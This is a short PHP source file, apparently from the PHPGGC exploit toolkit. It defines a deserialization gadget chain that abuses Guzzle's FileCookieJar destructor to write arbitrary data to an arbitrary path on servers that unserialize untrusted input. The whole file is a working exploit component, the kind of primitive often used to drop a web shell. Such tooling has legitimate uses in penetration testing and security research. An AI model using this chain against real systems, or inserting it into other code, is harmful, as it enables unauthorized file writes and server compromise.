<?php

namespace GadgetChain\Guzzle;

class FW1 extends \PHPGGC\GadgetChain\FileWrite
{
    public static $version = '4.0.0-rc.2 <= 7.5.0+';
    public static $vector = '__destruct';
    public static $author = 'cfreal';

    public function generate(array $parameters)
    {
        $path = $parameters['remote_path'];
        $data = $parameters['data'];

        return new \GuzzleHttp\Cookie\FileCookieJar($path, $data);
    }
}
